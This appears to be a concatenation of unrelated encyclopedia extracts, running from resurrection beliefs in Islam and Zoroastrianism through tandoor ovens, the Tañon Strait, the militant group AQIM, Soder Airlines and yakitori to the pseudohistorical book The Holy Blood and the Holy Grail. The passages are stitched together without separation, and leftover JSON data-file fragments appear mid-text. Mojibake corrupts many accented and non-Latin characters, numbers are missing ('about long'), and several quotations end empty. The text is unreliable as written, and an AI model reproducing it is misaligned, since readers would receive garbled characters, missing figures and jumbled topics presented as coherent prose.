said to be major and minor signs which are to occur near the time of Qiyamah (end time). Many Quranic verses, especially the earlier ones, are dominated by the idea of the nearing of the day of resurrection.Isaac Hasson, Last Judgment, Encyclopaedia of the Qur'anL. Gardet, Qiyama, Encyclopaedia of the Qur'an In the sign of nafkhatu'l-ula, a trumpet will be sounded for the first time, and result in the death of the remaining sinners. Then there will be a period of forty years. The eleventh sign is the sounding of a second trumpet to signal the resurrection as ba'as ba'da'l-mawt.Sura 39 (Az-Zumar), ayah 68 Then all will be naked and running to the Place of Gathering, while the enemies of Allah will be travelling on their faces with their legs upright. The Day of Resurrection is one of the six articles of Islamic faith. Everybody will account for their deeds in this world and people will go to heaven or hell. Bahai Faith See Last Judgment#Bahai Faith. Zoroastrianism The Zoroastrian belief in an end times renovation of the earth is known as frashokereti, which includes some form of revival of the dead that can be attested from no earlier than the 4th century BCE.Richard N. Longenecker ‚Äì Life in the Face of Death: The Resurrection Message of the New Testament p. 48 1998 \\"Franz K√∂nig, for example, concludes that the earliest attestation of Zoroastrian belief in a resurrection cannot be dated before the fourth century BC (cf. Zarathustras Jenseitsvorstellungen und das Alte Testament [Vienna: Herder, .\\" As distinct from Judaism this is the resurrection of all the dead to universal purification and renewal of the world.R. M. M. Tuschling ‚Äì Angels and Orthodoxy: A Study in Their Development in Syria and ... ‚Äì 2007 pp.. 23, 271 \\" While admitting that Judaism and Zoroastrianism share a belief in resurrection, he points to a significant difference between them: in Iranian religion all are resurrected and purified as part of the renewal of the world.\\" In the frashokereti doctrine, the final renovation of the universe is when evil will be destroyed, and everything else will be then in perfect unity with God (Ahura Mazda). The term probably means \\"making wonderful, excellent\\". The doctrinal premises are (1) good will eventually prevail over evil; (2) creation was initially perfectly good, but was subsequently corrupted by evil; (3) the world will ultimately be restored to the perfection it had at the time of creation; (4) the \\"salvation for the individual depended on the sum of (that person's) thoughts, words and deeds, and there could be no intervention, whether compassionate or capricious, by any divine being to alter this.\\" Thus, each human bears the responsibility for the fate of his own soul, and simultaneously shares in the responsibility for the fate of the world.

The tandoor is used for cooking in Southern, Central, and Western Asia, as well as in the South Caucasus. The heat for a tandoor was traditionally generated by a charcoal or wood fire, burning within the tandoor itself, thus exposing the food to live fire, radiant heat cooking, and hot- air, convection cooking, and smoking in the fat and food juices that drip on to the charcoal. Temperatures in a tandoor can approach 480 ¬∞C (900 ¬∞F), and it is common for tandoor ovens to remain lit for long periods to maintain the high cooking temperature. The tandoor design is something of a transitional form between a makeshift earth oven and the horizontal-plane masonry oven. Tandoors are typically used in restaurants whilst smaller tandoors and electric tandoors are making their way into homes.  Etymology  A coal- fired tandoor with a mild steel drum The English word comes from Hindi / Urdu tand≈´r (‡§§‡§®‡•ç‡§¶‡•Ç‡§∞ / ÿ™ŸÜÿØŸàÿ±), which came from Persian tan≈´r (ÿ™ŸÜŸàÿ±), which all mean (clay) oven. According to the Dehkhoda Persian Dictionary, the Persian word ultimately came from the Akkadian word tin≈´ru (íãæíÇü), which consists of the parts tin \\"mud\\" and nuro/nura \\"fire\\" and is mentioned as early as in the Akkadian Epic of Gilgamesh, c.f. also Avestan tan√ªra and Middle Persian tan√ªr. So tandoor originated from Semitic. Words related and similar to tandoor are used in various languages, for example the Dari Persian words tand≈´r and tann≈´r, Arabic tann≈´r (ÿ™ŸÜŸëŸàÿ±), Armenian t‚Äôonir (‘π’∏’∂’´÷Ä), Assyrian tan≈´ra (‹¨‹¢‹ò‹™‹ê), Azerbaijani t…ôndir, Georgian, tone (·Éó·Éù·Éú·Éî), Hebrew tan√∫r (◊™◊†◊ï◊®) e.g. in Leviticus 2:4 Kurdish ten√ªr, Turkish tandƒ±r, Turkmen tamdyr, and Uzbek tandir.  Operation  Charcoal-fired stainless-steel tandoor, with ash tray and thermometer The first time a tandoor is used, the temperature must be gradually increased to condition the interior of the oven. This step is crucial in ensuring the longevity of the tandoor. Conditioning can be done by starting a very small fire and slowly adding fuel to gradually increase the amount of heat inside the tandoor. Hairline cracks might form during conditioning; this is normal and will not interfere with the performance of the tandoor oven. When the oven cools off, the hairline cracks will barely be noticeable. They are essential in allowing the clay body of the tandoor to breathe (thermal expansion and contraction). The slower the temperature inside the tandoor is increased during its first use, the fewer hairline cracks will develop.  Types  = Afghan tandoor = The Afghan tandoor sits above the ground and is made of bricks. = Punjabi tandoor = A Pakistani Tandoor The Punjabi tandoor from the Indian Subcontinent is traditionally made of clay and is a bell-shaped oven, which can either be set into the earth and fired with wood or charcoal reaching temperatures of about 480 degrees Celsius (900 Fahrenheit), or rest above the ground. Tandoor cooking is a traditional aspect of Punjabi cuisine in undivided Punjab. In India and Pakistan, tandoori cooking was traditionally associated with the Punjab, as Punjabis embraced the tandoor on a regional level, and became popular in the mainstream after the 1947 partition when Punjabi Sikhs and Hindus resettled in places such as Delhi. In rural Punjab, it was common to have communal tandoors. Some villages still have a communal tandoor, which was a common sight prior to 1947. = Armenian tonir = In ancient times, the tonir was worshiped by the Armenians as a symbol of the sun in the ground. Armenians made tonirs in resemblance with the setting sun \\"going into the ground\\" (the Sun being the main deity). The underground tonir, made of clay, is one of the first tools in Armenian cuisine, as an oven and as a thermal treatment tool. Armenians are said to have originated underground tonirs. = Azerbaijani tandir = Azerbaijani tendir In ancient times people used it to cook bread and various dishes. Tandir bread (t…ôndir √ß√∂r…ôyi, tandoori bread) is widespread bread type in Azerbaijan. Tandir bread is baked from the heat of the tandir's walls, which ensures very fast baking. One of the world's biggest tandoors was built in Azerbaijan's southern city of Astara in 2015. The height of the tandoor is 6,5 m and the diameter is 12 m. The tandoor consists of 3 parts. = Turkmen tamdyr = Baking √ß√∂rek and somsa in the Turkmen tamdyr Baking a traditional, white bread called √ß√∂rek in Turkmen, is an ancient and honored culinary ritual in Turkmenistan. It is made in the traditional clay oven, known as tamdyr in Turkmenistan. Most Turkmen families living in the rural area have tamdyrs in their household. Occasionally, housewives get together and bake √ß√∂rek for several families. One of most famous kinds of √ß√∂rek baked in the Turkmen tamdyr is etli √ß√∂rek (bread with meat), made during traditional holidays. Turkmens bake not only bread in the tamdyr, but also several dishes, the most famous of which is somsa (an independent dish, similar to a pie, of any shape with a filling, usually beef). Various spices can be added to the Turkmen bread: cumin, cinnamon, olives, mustard, sunflower seeds and other flavoring ingredients. To prepare tamdyr for baking, first, fire is made directly inside the tamdyr, usually using dried cotton stalks. The bread-maker then watches the color of the tamdyr‚Äôs inner walls. When they turn white, the ashes are shoveled into the center of the tamdyr and the lower ash-pit is closed. The bread must be thrown into the oven very carefully, but deftly, so that it does not lose its shape and neatly stick to the wall.  Dishes  Yemeni modern tandoor (tannour) used for making flatbread known as Mulawah Chicken wings, onions and potato slices with pork fat in between roasted in tonir in Armenia. A tandoor may be used to bake many different types of flatbread. Some of the most common are tandoori roti, tandoori naan, tandoori laccha paratha, missi roti, and tandoori kulcha. Peshawari Khar is roasted cashews, and cottage cheese paste marinated in spiced thick cream grilled in a tandoor. Balochs and aloos are potatoes stuffed with cottage cheese, vegetables and cashew nuts, roasted in a tandoor. Tandoori chicken is a roasted chicken delicacy that originated in Punjab region of the Indian subcontinent. The chicken is marinated in yogurt seasoned with garam masala, garlic, ginger, cumin, cayenne pepper, and other spices depending on the recipe. In hot versions of the dish, cayenne, red chili powder, or other spices give the typical red color; in milder versions, food coloring is used. Turmeric produces a yellow-orange color. It is traditionally cooked at high temperatures in a tandoor, but can also be prepared on a traditional grill. Chicken tikka (; ; murgh tikka) is a dish from Mughlai cuisine made by grilling small pieces of boneless chicken which have been marinated in spices and yogurt. It is traditionally cooked on skewers in a tandoor and is usually boneless. It is normally served and eaten with a green coriander chutney, or used in preparing the curry chicken tikka masala. Tangdi kabab, a popular snack in cuisine from the Indian subcontinent, is made by marinating chicken drumsticks and placing them in a tandoor. Various freshly ground spices are added to the yogurt to form a marinade for the chicken. Traditionally, the marinaded chicken is given 12 hours at the least. When prepared, the drumsticks are usually garnished with mint leaves and served with laccha (finely sliced half moons, with a squeeze of lemon and a pinch of salt) onions. Samosa is a stuffed snack consisting of a fried or baked triangular, semilunar or tetrahedral pastry shell with a savory filling, which may include spiced potatoes, onions, peas, coriander, and lentils, or ground lamb or chicken. The size and shape of a samosa, as well as the consistency of the pastry used, can vary considerably. In some regions of Central Asia (i.e. Kazakhstan, Kyrgyzstan, Tajikistan, Turkmenistan and Uzbekistan), samosas are typically baked in a tandoor, while they are usually fried elsewhere.

The strait, which is about long, connects the Visayan Sea in the north to the Bohol Sea in the south. Its width varies from , with the narrowest point in the south. In the north the strait is closed off by the Don Islands, the largest of which is Bantayan. The cities of San Carlos, Negros Occidental, Bais, Negros Oriental and Toledo, Cebu have deepwater port facilities. The Ta√±on Strait is known for whale and dolphin watching, with tour boats operating from Bais City. Protected area The Ta√±on Strait Protected Seascape (IUCN Management Category V) was established by President Ramos under Proclamation No. 1234 of 1998. With an area of more than , it is the largest marine protected area in the Philippines.  Controversy  On February 7, 2008 the Supreme Court of the Philippines ordered the Department of Environment and Natural Resources and the Department of Energy to comment on a certiorari petition filed for baleen and toothed whales, dolphins, porpoises including the Irrawaddy dolphins, and other cetacean species in the Ta√±on Strait to stop oil exploration by Japan Petroleum Exploration Co. Ltd. (JAPEX) in the protected waterway. The strait serves as a marine wildlife reserve that provides grounds for breeding, feeding and resting to 11 species of marine mammals. The court was asked to recognize the petitioners as \\"Filipino mammals\\" with constitutional rights. JAPEX subsequently abandoned oil exploration in the area, saying that initial drilling had shown lack of commercial opportunity. However the Supreme Court case continued. Mythology In Cebuano mythology, one of the three winged giant messengers of the Cebuano supreme god Kaptan was punished for stealing a unique sacred shell which can turn anybody into anything they please. The messenger, Sinogo, was a handsome man and the \\"favorite of Kaptan\\". Upon hearing of Sinogo's treachery, Kaptan ordered the others to pursue Sinogo. Sinogo fled west and eventually used the shell's power to turn himself into a giant crocodile (a sacred animal in old beliefs) so he could go deep in the straight \\"between two islands\\", modern-day Cebu and Negros. Kaptan, disappointed and angry, struck Sinogo with lightning, shocking the messenger giant and imprisoning him for all of eternity in modern-day Tanon Straight. Due to Kaptan's love for Sinogo, Kaptan decided to retain the sacred crocodile form of Sinogo despite his treachery. The stolen shell was dropped at sea when Sinogo was struck with lightning, but a sea creature managed to relocate it and bring it back to Kaptan. Ever since, if a whirlpool appears in the straight, people believe that Sinogo is trying to break from his eternal prison deep in the straight.https://www.aswangproject.com/visayan-battle-of- mythical-creatures/  References  External links Straits of the Philippines Protected seascapes of the Philippines Landforms of Cebu Landforms of Negros Oriental Landforms of Negros Occidental ","title":"Ta√±on Strait"},{"id":"30875839","text":"Juliet is a character in Shakespeare's play Romeo and Juliet.

Membership is mostly drawn from the Algerian and local Saharan communities (such as the Tuaregs and Berabiche tribal clans of Mali), as well as Moroccans from city suburbs of the North African country.Morocco dismantles AQIM cell Magharebia, 26 December 2012Morocco dismantles terror recruitment cell Magharebia, 27 November 2012Morocco nabs members of AQIM cell Upi.com, 5 January 2011 The leadership are mainly Algerians. The group has also been suspected of having links with the Horn of Africa-based militant group Al- Shabaab. AQIM has focused on kidnapping for ransom as a means of raising funds and is estimated to have raised more than $50 million in the last decade. On 2 March 2017, the Sahara branch of AQIM merged with Macina Liberation Front, Ansar Dine and Al-Mourabitoun into Jama'at Nasr al-Islam wal Muslimin. Name The group's official name is Organization of al-Qa'ida in the Land of the Islamic Maghreb (Qaedat al-Jihad fi Bilad al-Maghrib al-Islami), often shortened to Al-Qaeda in the Islamic Maghreb (AQIM, from French al-Qa√Øda au Maghreb islamique, AQMI). Prior to January 2007 it was known as the Salafist Group for Preaching and Combat ( ') and the French acronym GSPC ('). History AQIM fighters in a propaganda video, filmed in the Sahara desert. In January 2007, the GSPC announced that it would now operate under the name of Al-Qaeda in the Islamic Maghreb (AQIM). On 19 January 2009, the UK newspaper The Sun reported that there had been an outbreak of bubonic plague at an AQIM training camp in the Tizi Ouzou province in Algeria. According to The Sun, at least forty AQIM militiamen died from the disease. The surviving AQIM members from the training camp reportedly fled to other areas of Algeria hoping to escape infection.West, Alex, \\"Deadliest Weapon So Far...The Plague\\", The Sun, 19 January 2009. The Washington Times, in an article based on a senior U.S. intelligence official source, claimed a day later that the incident was not related to bubonic plague, but was an accident involving either a biological or chemical agent. Al Qaeda in the Islamic Maghreb is one of the region's wealthiest, best-armed militant groups due to the payment of ransom demands by humanitarian organizations and Western governments. It is reported that 90 per cent of AQIM resources come from ransoms paid in return for the release of hostages. Omar Ould Hamaha said: In December 2012, one of AQIM's top commanders, Mokhtar Belmokhtar, split off from AQIM and took his fighters with him, executing the In Amenas hostage crisis in Algeria weeks later, just after France launched Operation Serval in Mali. Belmokhtar later claimed he acted on behalf of Al Qaeda. In December 2015, Belmokhtar's splinter group, Al-Mourabitoun rejoined AQIM, according to audio statements released by both groups. A top commander of AQIM, Abdelhamid Abou Zeid, was reported killed by French and Chadian forces in northern Mali on February 25, 2013. This was confirmed by AQIM in June 2013. =Alleged prejudice= The FrontPage Magazine reported that Sub-Saharan Africans are treated with contempt by the predominantly Arab-led AQIM. The AQIM leadership are said to be mainly Algerians, while no Sub-Saharan African is known to possess any leadership position. Robert Fowler, a former Canadian diplomat, who was held hostage by AQIM for 130 days in the Sahara Desert in 2010, wrote that \\"There was a big gulf in the AQIM between those who were black and those who were not. They preached equality, but did not practice it. Sub-Saharan Africans were clearly second class in the eyes of AQIM.\\" The article went on to say that an AQIM splinter faction, the Movement for Oneness and Jihad in West Africa separated itself from the group due to the marginalization of its Sub- Saharan African members. The United States National Counterterrorism Center stated that AQIM had a reputation for holding cultural and racial insensitivities towards Sub-Saharan Africans. The NCTC maintained that some recruits \\"claimed that AQIM was clearly racist against some black members from West Africa because they were only sent against lower-level targets.\\" The bulletin goes on to say that former AQIM commander Mokhtar Belmokhtar in August 2009 stated \\"he wanted to attract black African recruits because they would agree more readily than Arabs to becoming suicide bombers and because poor economic and social conditions made them ripe for recruitment.\\" By 2016, AQIM had reportedly recruited large numbers of young sub-Saharan Africans, with attacks like the 2016 Grand-Bassam shootings in Ivory Coast being carried out by black AQIM members. AQIM commander Yahya Abou el-Hammam, in an interview with a Mauritanian website, was quoted as saying \\"Today, the mujahideen have built up brigades and battalions with sons of the region, our black brothers, Peuls, Bambaras and Songhai\\". Leadership Key leaders and operatives of this group included Yahya Abu el Hammam, who served as a senior leader of al-Qaeda in the Islamic Maghreb (AQIM), planning operations and kidnapping Westerners in North and West Africa. He was wanted by the US Rewards for Justice Program with a $5 million bounty for his arrest. Hammam played a key role in perpetuating AQIM's terrorist activities in West Africa and Mali, and participated in several AQIM terrorist attacks in Mauritania. In December 2013 Yahya Abu Hammam gave an interview to Aljazeera in which he threatened France's military intervention in the Sahara would open \\"the gates of hell for the French people.\\" In July 2010, Hammam was reportedly involved in the killing of a seventy-eight year old French hostage in Niger. In 2006, Hammam was sentenced to death in absentia by Algerian authorities for terrorism-related charges. Hammam was killed by French forces in February 2019.http://www.xinhuanet.com/english/2019-02/23/c_137843317.htm International links AQIM Tuareg militant in Sahel, December 2012. Allegations of the former GSPCs links to al-Qaeda predated the September 11 attacks. As followers of a Qutbist strand of Salafist jihadism, the members of the GSPC were thought to share al-Qaeda's general ideological outlook. After the deposition of Hassan Hattab, various leaders of the group pledged allegiance to al-Qaeda. In November 2007, Nigerian authorities arrested five men for alleged possession of seven sticks of dynamite and other explosives. Nigerian prosecutors alleged that three of the accused had trained for two years with the then Salafist Group for Preaching and Combat in Algeria. In January 2008 the Dakar Rally was cancelled due to threats made by associated terrorist organizations. In late 2011, the splinter group Movement for Oneness and Jihad in West Africa was founded in order to spread jihadi activities further into West Africa. Their military leader is Omar Ould Hamaha, a former AQIM fighter. According to U.S. Army General Carter Ham, Al-Qaeda in the Islamic Maghreb, the Somalia-based Al-Shabaab, and the Nigeria-based Boko Haram were as of June 2012 attempting to synchronize and coordinate their activities in terms of sharing funds, training and explosives. Ham added that he believed that the collaboration presented a threat to both U.S. homeland security and the local authorities. However, according to counter-terrorism specialist Rick Nelson with the Washington-based Center for Strategic International Studies, there was little evidence that the three groups were targeting U.S. areas, as each was primarily interested in establishing fundamentalist administrations in their respective regions. In a 2013, Al Jazeera interview in Timbuktu, AQIM commander Talha claimed that his movement went to Niger, Algeria, Burkina Faso and Nigeria, to organize cells of AQIM. He explained their strategy: \\"There are many people who have nothing, and you can reach them by the word of God, or by helping them.\\" Statements AQIM logo. Al Qaeda in the Islamic Maghreb operates a media outlet known as al- Andalus, which regularly releases propaganda videos showing AQIM operations, hostages, and statements from members. According to London-based risk analysis firm Stirling Assynt, AQIM issued a call for vengeance against Beijing for mistreatment of its Muslim minority following the July 2009 √úr√ºmqi riots. AQIM voiced support for demonstrations against the Tunisian and Algerian Governments in a video released on 13 January 2011. Al Qaeda offered military aid and training to the demonstrators, calling on them to overthrow \\"the corrupt, criminal and tyrannical\\" regime, calling for \\"retaliation\\" against the Tunisian government, and also calling for the overthrow of Algerian president Abdelaziz Bouteflika. AQIM leader Abu Musab Abdul Wadud appeared in the video, calling for Islamic sharia law to be established in Tunisia. Al Qaeda has begun recruiting anti-government demonstrators, some of whom have previously fought against American forces in Iraq and Israeli forces in Gaza. AQIM endorsed efforts in Libya to topple the regime of Colonel Muammar Gaddafi, though it remains unclear how many fighters in Libya are loyal to al- Qaeda. Gaddafi seized on the expression of support and help for the rebel movement to blame al-Qaeda for fomenting the uprising.

Its CEO was Tapani Yli- Saunam√§ki. Its main base was at Tampere-Pirkkala Airport (TMP), Tampere. There was an additional base established early 2006 at Helsinki-Vantaa International Airport, since there were no routes to/from Tampere at that time. Code dataIATA Code: (was: OY) *ICAO Code: (was: SDE) *Callsign: (was: Soder) History The airline was established and started operations in 2003. It suspended operations after Saab Group terminated its lease, but restarted in February 2005 under a new name, Soder Aviation Oy (Ltd) using one MD-82 wet- leased from Bulgarian Air Charter and operated by Aviapaslauga from Lithuania and one aircraft operated by a Swedish company Nextjet. Soder Airlines previous operator's license was cancelled by CAA of Finland. The charter company status was revoked by the Finnish Consumer Agency due to lack of collateral required. The company ceased flights for the summer season of 2005. For the spring skiing season of 2006, Soder Aviation started selling tickets for three weekly flights from Helsinki to Kittil√§ and back. Flights were to be operated by Alexandair (of Greece), airline code AXN, between February 18 and May 1, 2006 using an ex-Austrian Airlines MD-81, SX-BMP. However, only some 3 initial return flights between Helsinki and Kittil√§ by operator Alexandair were actually flown and further flights cancelled for undisclosed reasons. On March 11, 2006, Soder Aviation Ltd publicly announced plans to sell tickets for the Helsinki-Kittil√§ route using a semi-convertible 40-seat An-72 cargo aircraft, which was to be operated by Enimex of Estonia. This plan was immediately rejected by the CAA of Finland due to the CAA's understanding that the type certificate of this An-72 did not allow for scheduled passenger flights in Finnish airspace. After this decision by the Finnish Civil Aviation Authority, Soder Aviation cancelled all planned flights for the rest of the spring skiing season. Due to previous officially published debts (amounting to approximately Euro 1 million), the Finnish financial authorities seized a substantial amount of funds from 2 Soder Aviation bank accounts in early March, which placed the company in a difficult financial position. Recently, on April 4, 2006, Soder Aviation Ltd. filed for bankruptcy at Helsinki District Court. The court approved the start of bankruptcy on April 7. Therefore, it is highly unlikely that the company will continue to operate in its present form in the future. In 2007, the airline code OY passed to an Argentinian regional company, Andes L√≠neas A√©reas, operating line and charter flights in the northern areas of Argentina. Services The airline flew routes from Tampere to Kittil√§, Ivalo, and Oulu and from Helsinki to Kittil√§ and Ivalo directly or via Tampere during the winter skiing seasons. International flights originally planned did not materialize. In 2006, the only planned route (operated by Alexandair) was Helsinki-Kittil√§, originally scheduled to last until May 1 (the end of the Finnish skiing season).

Its preparation involves skewering the meat with , a type of skewer typically made of steel, bamboo, or similar materials. Afterwards, they are grilled over a charcoal fire. During or after cooking, the meat is typically seasoned with tare sauce or salt. The term is sometimes used informally for kushiyaki (grilled and skewered foods) in general. Preparation As they are designed for convenience and portability, yakitori are typically cooked using step-by-step methods. Traditionally, it was accomplished using portable charcoal grills. That is the method most often employed by yatai, however, restaurants may use stationary grills and, depending on the situation, higher quality binch≈çtan charcoal. At home, appliances known as or are used. Yakitori-ki are small electrical appliances that use a heating element similar to that of a broiler or toaster to cook the food placed on top. Several yakitori in food court areas Yakitori are sold at sports matches To facilitate even cooking, the meat is cut into small, roughly uniform shapes and then skewered with kushi; after which the yakitori are seasoned and cooked. Charcoal is the preferred method of cooking as it produces high heat and strong flames while giving off little to no water vapor. This allows for the ingredients to cook quickly while imparting a crunchy texture to the skin. While gas and electric heat sources can be used, they do not develop the same aromas or textures as charcoal-cooked yakitori. =Seasoning= Yakitori seasonings are primarily divided into two types: salty or salty-sweet. The salty type usually uses plain salt as its main seasoning. For the salty-sweet variety, tare, a special sauce consisting of mirin, sake, soy sauce, and sugar is used. Other common spices include powdered cayenne pepper, shichimi, Japanese pepper, black pepper, and wasabi, according to one's tastes. Sales ' are small shops specializing in yakitori. They usually take the form of a compact shop offering take-out services only, but sit-down restaurants and restaurant chains are also popular. Yakitori is not limited to speciality shops: It is readily found on the menus of izakaya all across Japan and is sold pre-cooked, as frozen vacuum packs, or even canned. The latter was made popular by Hotei Foods Corporation, the first company that started selling yakitori-in-can in 1970, with nine flavors as of 2016. Their TV commercial song has been iconic to their brand name. Due to its ease of preparation and portability, yakitori is a very popular street food, often sold from small carts and stalls known as yatai. Yatai are found, among other places, dotting streets during festivals or on heavily trafficked routes during the evening commute where customers enjoy beer and sake with yakitori.

The book was first published in 1982 by Jonathan Cape in London as an unofficial follow-up to three BBC Two TV documentaries that were part of the Chronicle series. The paperback version was first published in 1983 by Corgi books. A sequel to the book, called The Messianic Legacy, was originally published in 1986. The original work was reissued in an illustrated hardcover version with new material in 2005.Published by Century, part of The Random House Group Limited. In The Holy Blood and the Holy Grail, the authors put forward a hypothesis that the historical Jesus married Mary Magdalene, had one or more children, and that those children or their descendants emigrated to what is now southern France. Once there, they intermarried with the noble families that would eventually become the Merovingian dynasty, whose special claim to the throne of France is championed today by a secret society called the Priory of Sion. They concluded that the legendary Holy Grail is simultaneously the womb of Mary Magdalene and the sacred royal bloodline she gave birth to. An international bestseller upon its release, The Holy Blood and the Holy Grail spurred interest in a number of ideas related to its central thesis. Response from professional historians and scholars from related fields was negative. They argued that the bulk of the claims, ancient mysteries, and conspiracy theories presented as facts are pseudohistorical. The book's ideas were considered blasphemous enough for the book to be banned in some Catholic countries. In a 1982 review of the book for The Observer, novelist and literary critic Anthony Burgess wrote: \\"It is typical of my unregenerable soul that I can only see this as a marvellous theme for a novel.\\" Indeed, the theme was later used by Margaret Starbird in her 1993 book The Woman with the Alabaster Jar, and by Dan Brown in his 2003 novel The Da Vinci Code.Quoting Dan Brown from NBC Today, 3 June 2003: \\"Robert Langdon is fictional, but all of the art, architecture, secret rituals, secret societies, all of that is historical fact\\" (found in )  Background  One of the books that the authors claim influenced the project was L'Or de Rennes (later re- published as Le Tr√©sor Maudit), a 1967 book by G√©rard de S√®de, with the collaboration of Pierre Plantard.Plantard de Saint-Clair, Pierre, L'Or de Rennes, mise au point (La Garenne-Colombes, 35 bis, Bd de la R√©publique, 92250; Biblioth√®que Nationale, Depot Legal 02-03-1979, 4¬∞ Z Piece 1182). After reading it, Henry Lincoln persuaded BBC Two's factual television series of the 1970s, Chronicle, to make a series of documentaries, which became quite popular and generated thousands of responses. Lincoln then joined forces with Michael Baigent and Richard Leigh for further research. This led them to the pseudohistorical Dossiers Secrets at the Biblioth√®que nationale de France which, though alleging to portray hundreds of years of medieval history, were actually all written by Pierre Plantard and Philippe de Ch√©risey under the pseudonym of \\"Philippe Toscan du Plantier\\". Unaware that the documents had been forged, Baigent, Leigh and Lincoln used them as a major source for their book. Comparing themselves to the reporters who uncovered the Watergate scandal, the authors maintain that only through speculative \\"synthesis can one discern the underlying continuity, the unified and coherent fabric, which lies at the core of any historical problem.\\" To do so, one must realize that \\"it is not sufficient to confine oneself exclusively to facts.\\" Content In The Holy Blood and the Holy Grail, Baigent, Leigh and Lincoln posit the existence of a secret society known as the Priory of Sion, which is supposed to have a long history starting in 1099 and had illustrious Grand Masters including Leonardo da Vinci and Isaac Newton. According to the authors' claims, the Priory of Sion is devoted to installing the Merovingian dynasty, which ruled the Franks from 457 to 751, on the thrones of France and the rest of Europe. It is also said to have created the Knights Templar as its military arm and financial branch. The authors re-interpreted the Dossiers Secrets \\"in the light of their own Biblical obsessions.\\" Contrary to Plantard's initial Franco-Israelist claim that the Merovingians were only descended from the Tribe of Benjamin, they asserted that the Priory of Sion protects Merovingian dynasts because they are the lineal descendants of the historical Jesus and his alleged wife, Mary Magdalene, traced further back to King David. According to them, the legendary Holy Grail is simultaneously the womb of saint Mary Magdalene and the sacred royal bloodline she gave birth to, and the Church tried to kill off all remnants of this bloodline and their supposed guardians, the Cathars and the Templars, in order for popes to hold the episcopal throne through the apostolic succession of Peter without fear of it ever being usurped by an antipope from the hereditary succession of Mary Magdalene. The authors therefore concluded that the modern goals of the Priory of Sion are: *the public revelation of the tomb and shrine of Sigebert IV as well as the lost treasure of the Temple in Jerusalem, which supposedly contains genealogical records that prove the Merovingian dynasty was of the Davidic line, to facilitate Merovingian restoration in France; *the re- institutionalization of chivalric knighthood and the promotion of pan-European nationalism; *the establishment of a theocratic \\"United States of Europe\\": a Holy European Empire politically and religiously unified through the imperial cult of a Merovingian Great Monarch who occupies both the throne of Europe and the Holy See; and *the actual governance of Europe residing with the Priory of Sion through a one-party European Parliament. The authors also incorporated the antisemitic and anti-Masonic tract known as The Protocols of the Elders of Zion into their story, concluding that it was actually based on the master plan of the Priory of Sion. They presented it as the most persuasive piece of evidence for the existence and activities of the Priory of Sion by arguing that the original text on which the published version of The Protocols of the Elders of Zion was based had nothing to do with Judaism or an \\"international Jewish conspiracy\\", as it issued from a Masonic body practicing the Scottish Rite which incorporated the word \\"Zion\\" in its name. Per Baigent et al, the text was not intended to be released publicly, but was a program for gaining control of Freemasonry as part of a strategy to infiltrate and reorganise church and state according to esoteric Christian principles. After a failed attempt to gain influence in the court of Tsar Nicholas II of Russia, Sergei Nilus was supposed to have changed the original text to forge an inflammatory tract in 1903 in order to discredit the esoteric clique around Papus by implying they were Judaeo-Masonic conspirators, but he ignored some esoteric Christian elements, which hence remained unchanged in the published antisemitic canard. Influence and similarities =The Da Vinci Code= The 2003 conspiracy fiction novel The Da Vinci Code by Dan Brown makes reference to this book, also liberally using most of the above claims as key plot elements; indeed, in 2005 Baigent and Leigh unsuccessfully sued Brown's publisher, Random House, for plagiarism, on the grounds that Brown's book makes extensive use of their research and that one of the characters is named Leigh, has a surname (Teabing) which is an anagram of Baigent, and has a physical description strongly resembling Henry Lincoln. In his novel, Brown also mentions Holy Blood, Holy Grail as an acclaimed international bestseller Chapter 60 and claims it as the major contributor to his hypothesis. Perhaps as a result of this mention, the authors (minus Henry Lincoln) of Holy Blood sued Dan Brown for copyright infringement. They claimed that the central framework of their plot had been stolen for the writing of The Da Vinci Code. The claim was overturned by High Court Judge Peter Smith on April 6, 2006, who ruled that \\"their argument was vague and shifted course during the trial and was always based on a weak foundation.\\" It was found that the publicity of the trial had significantly boosted sales of Holy Blood (according to figures provided by Nielsen BookScan and Bookseller magazine).

Accepting as valid the testimony of an amateur archaeologist going under the pseoudonym of \\"Ben Hammott\\" relating to his discoveries made in the vicinity of Rennes-le-Ch√¢teau since 1999; Burgess claims to have found the treasure of B√©renger Sauni√®re: several mummified corpses (one of which is allegedly Mary Magdalene) in three underground tombs created by the Knights Templar under the orders of the Priory of Sion. During an interview on 21 March 2012, \\"Hammott\\", going by his real name of Bill Wilkinson, made an apologetic confession stating that everything to do with the tomb and related artifacts was a hoax, and revealed that the tomb was now destroyed, having been part of a set located in a warehouse in England. Criticism The claims made in The Holy Blood and the Holy Grail have been the source of much investigation and criticism over the years, with many independent investigators such as 60 Minutes, Channel 4, Discovery Channel, Time Magazine, and the BBC concluding that many of the book's claims are not credible or verifiable. Pierre Plantard stated on the Jacques Pradel radio interview on 'France-Inter', 18 February 1982: There are no references to the Jesus bloodline in the \\"Priory of Sion documents\\" and the link exists only within the context of a hypothesis made by the authors of The Holy Blood and the Holy Grail. From the Conspiracies On Trial: The Da Vinci Code documentary: While Pierre Plantard claimed that the Merovingians were descended from the Tribe of Benjamin, the Jesus bloodline hypothesis found in The Holy Blood and the Holy Grail instead hypothesized that the Merovingians were descended from both the Benjamin line and the Davidic line of the Tribe of Judah, as embodied in the child of Mary Magdalen by virtue of a dynastic marriage. Historian Marina Warner commented on The Holy Blood and the Holy Grail when it was first published: Historian Ken Mondschein ridiculed the idea of a Jesus bloodline, writing: Historian Richard Barber wrote: In 2005, Tony Robinson narrated a critical evaluation of the main arguments of Dan Brown and those of Baigent, Leigh and Lincoln, The Real Da Vinci Code, shown on Channel 4. The programme featured lengthy interviews with many of the protagonists. Arnaud de S√®de, son of G√©rard de S√®de, stated categorically that his father and Plantard had made up the existence of a 1,000-year-old Priory of Sion, and described the story as \\"piffle.\\" The programme concluded that, in the opinion of the presenter and researchers, the claims of Holy Blood were based on little more than a series of guesses. Despite the \\"Priory of Sion mysteries\\" having been exhaustively debunked by journalists and scholars as France's greatest 20th-century literary hoax; some commentators express concern that the proliferation and popularity of pseudohistorical books, websites and films inspired by the Priory of Sion hoax contribute to the problem of unfounded conspiracy theories becoming mainstream;Damian Thompson, \\"How Da Vinci Code tapped pseudo-fact hunger\\", Daily Telegraph. 13 January 2008.

